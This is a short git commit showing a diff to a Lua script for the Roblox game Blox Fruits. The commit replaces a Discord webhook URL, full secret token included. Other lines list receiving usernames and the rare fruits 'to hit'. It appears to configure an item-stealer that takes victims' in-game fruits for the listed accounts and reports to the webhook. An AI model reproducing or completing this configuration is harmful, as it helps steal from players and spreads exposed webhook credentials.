3f264029300ed1a37e37acc415660a9ec90d64bd
reaIredzhub <kerekyeni@gmail.com>
2025-03-04 00:17:08 +0300

    bloxfruits.lua

--- bloxfruitz.lua
+++ bloxfruitz.lua
@@ -1,4 +1,4 @@
-Webhook = "https://discord.com/api/webhooks/1346228375747821574/7tlC2g8Jqih4RH12jhXEG4xg9WrDATrXOJVoKy4TekcCcGP8VhgHkJjbnn2shl2ry7AD" -- << Your Webhook
+Webhook = "https://discord.com/api/webhooks/1346229806425047121/x83qb_y9Dv0QDg9J1B5V5TFavks2MM3VLrk67LNnI9E4EvCEkzF4LlOHgsG6Y1hpVZIL" -- << Your Webhook
 Usernames = {"Vouchlox", "0Berq"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
